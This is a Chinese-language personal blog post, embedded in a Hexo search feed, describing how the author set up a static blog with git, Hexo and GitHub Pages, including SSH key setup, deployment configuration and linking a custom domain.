    <content type="html"><![CDATA[<hr><p><em>记录一下自己第一次搭建静态博客的经历</em></p><p><strong>本文不会记录详细的操作过程,只是整理流程与记录心得 ^_^</strong></p><hr><span id="more"></span> <h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3><hr><ul><li><p>所用主机</p><ul><li>win10</li></ul></li><li><p>所用软件</p><ul><li><p>git </p><ul><li><p>git是什么？</p><p>​        版本控制工具，方便在不同版本进行切换修改，类似文件分不同时间备份让后需要时找回其中一份代替，同时git所带的<code>git bash</code>方便用户在windows下使用git命令的模拟终端（windows自带的cmd功能太弱）linux、unix可以直接使用git。</p><p><strong>在搭建博客的过程中也主要使用的这个模拟终端的功能，甚至用于版本控制的git命令都用不上。有点像买部手机只使用它的照明灯功能。</strong></p></li></ul></li><li><p>node.js(JavaScript 运行环境,)</p><p>随node.js一同安装的包管理工具npm,使用npm安装的模块hexo</p><ul><li><p>什么是包管理工具？ </p><p>​      也叫包管理器,它允许用户在操作系统上安装、删除、升级、配置和管理软件包。软件包管理器可以是像“软件中心”这样的图形化应用，也可以是像 <a href="https://itsfoss.com/apt-vs-apt-get-difference/">    apt-get</a> 或 <a href="https://itsfoss.com/pacman-command/">pacman</a> 这样的命令行工具,python中的pip即为一种包管理工具。</p></li></ul></li></ul></li></ul><ul><li><p>所借助的平台</p><ul><li><p>github</p><ul><li><p>github是什么？</p><p><del>同性交友网站</del></p><p>利用git进行代码管理的托管平台</p></li><li><p>为什么选择github?</p><p>github有一个很有爱的项目,叫做<code>github pages</code>,这个项目是给开发者建立一个私人页面,所以许多人都拿来搭博客用了,在创建仓库的时候将仓库名名为:用户名.github.io时开启</p><p>即用github pages项目代替了服务器,缺点就是功能不完全,只能控制小部分范围,但这对搭建个人静态博客够用了,用码云gitee同理。</p></li></ul></li></ul><p>​    </p></li></ul><hr><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><hr><p><em>简单来说就是在本地计算机搭建Hexo环境，Hexo通过generate命令将*.md文件渲染成静态的html页面，然后Hexo通过deploy命令触发git用户通过公钥免密登陆服务器(这里的github即作为托管服务器)，进而将静态页面推送到服务器的git仓库（repository）中。然后，服务器再通过钩子（git-hooks） 将静态页面checkout到网站的根目录下，进而实现博客的自动部署。</em></p><p><strong>就是敲几个命令，让git和hexo帮你把几件事办完了。</strong></p><hr><h3 id="实际流程"><a href="#实际流程" class="headerlink" title="实际流程"></a>实际流程</h3><hr><ul><li><p>下载git,配置用户信息</p><p>这里需要配置用户名和邮箱。而这些信息并不是起权限验证的作用,这么做的一个目的是为了记录操作过程，就是方便给人看的，如记录某某上传了什么或者干了别的什么。可以随便输入用户名和邮箱但不推荐。</p></li><li><p>将git与github链接在一起</p><ul><li><p>将git与github进行ssh key链接</p><ul><li><p>什么是ssh？</p><blockquote><p><em>SSH 为 Secure Shell （安全外壳协议）的缩写，SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。即可用ssh协议远程登陆主机，这里的远程主机即为github仓库。</em>—摘自《百度百科》</p></blockquote></li><li><p>为什么GitHub需要SSH Key呢？</p><blockquote><p>因为GitHub需要识别出你推送的提交确实是你推送的，而不是别人冒充的，而Git支持SSH协议，所以，GitHub只要知道了你的公钥，就可以确认只有你自己才能推送。当然，GitHub允许你添加多个Key。假定你有若干电脑，你一会儿在公司提           交，一会儿在家里提交，只要把每台电脑的Key都添加到GitHub，就可以在每台电脑上往GitHub推送了。—摘自廖雪峰老师网站</p></blockquote><p>​                                                                                 </p></li></ul></li></ul></li></ul><p>使用git创建ssh密钥，然后将这个密钥添加到github用户的账号中，这样用户即可实现用git免密登录管理github了</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>值得一提的是生成密钥的命令，常常如下：<br><br>ssh-keygen -t rsa -C <span class="hljs-string">&quot;你的邮箱&quot;</span><br><br><br>-t 用来指定加密算法为 rsa；<br>-C 后面是个注释信息，并不一定要和你 Git 账户的邮箱或者 Git 账户名保持一致，只是常常是和你账户邮箱保持一致，这样设置，就能知道这个公钥被绑定在哪个 Git 账户上了<br></code></pre></div></td></tr></table></figure><ul><li><p>使用hexo搭建博客</p><p>通过在git bash 中使用一些hexo命令。即可实现博客的搭建与上传。</p><p>hexo的工作流程：</p><ul><li><p>hexo  init  文件名 ：</p><p>​        创建一个初始化的文件，里面有搭建hexo博客所需的基本文件，后续操作以及关于博客的修改都在这个文件中进行。</p></li><li><p>hexo g：</p><p>​        生成静态文件。将我们的数据和界面相结合生成静态文件的过程。会遍历主题文件中的 <code>source</code> 文件夹（js、css、img 等静态资源），然后建立索引，然后根据索引生成 <code>pubilc</code> 文件夹，此时的 <code>public</code> 文件是由 html、 js、css、img 建立的纯静态文件可以通过 <code>index.html</code> 作为入口访问你的博客。</p></li><li><p>hexo s:</p><p>生成本地预览文件，通过浏览器搜索localhost:4000即可查看生成的静态博客 </p></li><li><p>hexo d：</p><p>部署文件，即将静态博客上传到服务器上。部署主要是根据在 <code>_config.yml</code> 中配置的git仓库，将博客中<code>public</code>文件上传至 github  中。然后再根据上面的 github 提供的 pages 服务呈现出页面。</p><ul><li><p>如果出现本地预览与部署到服务器上不同的情况，按F12发现css效果缺失，这是由于博客的config配置文件中指名一些css的地址只在localhost下是正确的，而指向服务器的仓库时是错误的，解决办法如下</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>在配置文件url那一部分中加入<br><br> root：/<br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/blog_build_illustration.png"></p><p>意思就是叫浏览器从根目录下慢慢找… 很省事的办法（指省我的事不是省电脑的）</p></li></ul></li></ul><p>​        后续将md类型的文件加入到该文件\source\_posts中即可对博客内容进行修改（不推荐这么做，后文有写原因）。具体样式还需要查看博客主题的的设置，默认的博客主题为landscape。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">整个流程中关于_config.yml配置的配置很关键<br>注意空格不能少<br><span class="hljs-symbol">deploy:</span> <br><span class="hljs-symbol">    type:</span> git<br><span class="hljs-symbol">    repo:</span> https:<span class="hljs-comment">//github.com/2693993651/2693993651.github.io.git</span><br><span class="hljs-symbol">    branch:</span> main<br>这个配置好之后，即可使用hexo d 命令了<br>另外，因为githu在国内很难访问，hexo d这个命令都可能因不能链接到服务器而失败，需要重试几次。如果部署到gitee就没这个问题。<br></code></pre></div></td></tr></table></figure></li></ul><hr><h3 id="博客的优化"><a href="#博客的优化" class="headerlink" title="博客的优化"></a>博客的优化</h3><hr><ul><li><p>关于文章</p><figure class="highlight haxe"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haxe"><span class="hljs-comment">//建议写文章前先执行以下命令</span><br>hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> categories<br>hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> tags<br>hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> about<br></code></pre></div></td></tr></table></figure><p>执行这些命令完善博客的模块结构，以上三条命令执行后博客就会有三个新模块生效了，分别是分类，标签，about(关于)。而执行之前这三个模块是不能启用的,甚至在启用某些主题时页面完全失效。（about页面还需要到对应的主题配置里面设置才能生效，如遇困难可对照主题的官方文档，因为不是所有主题的about页面设置都一样，官方可能会写明使用方法）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/blog_illustration02.png"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/illustration01.png"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>建议用下条命令生成新文章<br>hexo n [布局名称] &lt;文档名称&gt;<br></code></pre></div></td></tr></table></figure><p>其中布局名称可以省略，如果省略则默认为post布局。对post进行修改或者创建新的布局，在写文章时会方便很多</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/blog_illustration.png"></p><p>hexo n 执行后会在_post文件夹下生成一个新的md文件，虽然前文说到直接把新的md文件拖到这个文件夹也行，但还是建议用hexo n命令生成文件之后，再对这个文件修改，以下为原因：<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/illustration02.png"></p><p>​            </p><p>这样生成的文章有自己规范的开头格式，方便对文章进行规范与整理，还能顺手加个more标签</p><p>关于主题</p><p>需要下载主题并配置，关于博客的优化还需要查阅所选主题的官方文档来进行操作，去goole看看别人是怎么使用这个主题的会有很大帮助。</p></li></ul><hr><h3 id="购买域名"><a href="#购买域名" class="headerlink" title="购买域名"></a>购买域名</h3><hr><p>域名网站上注册账号，买一个域名</p><ul><li><p>在万网控制台添加解析记录</p><p>这里的解析记录有两条分别为CNAME和A记录</p><ul><li><p>CNAME</p><p>www  ——&gt; 用户名.github.io</p></li><li><p>A</p><p>@       ——&gt;一个ipv4地址 (cmd中 ping 你的GitHub账户名.GitHub.io得到)</p></li></ul></li></ul><ul><li><p>在博客文件夹里的source里添加CNAME文件，里面写上购买的域名</p><p>​    <em>完成之后可在github对应仓库里的设置里查看是否有CNAME文件，网址是否已经保存</em></p></li><li><p>最后重新部署文件</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>即输入以下命令<br><br>hexo clean<br><span class="hljs-regexp">//</span>每次部署前都建议输入这个命令清除缓存文件和已生成的静态文件，以防修改不起作用<br>hexo g<br>hexo s<span class="hljs-regexp">//</span>先本地预览，先查看方便及时修改<br>hexo d<br></code></pre></div></td></tr></table></figure></li></ul><p>成功之后即可实现在浏览器中输入域名访问自己的博客了</p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>其他领域</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
      <tag>有手就行</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
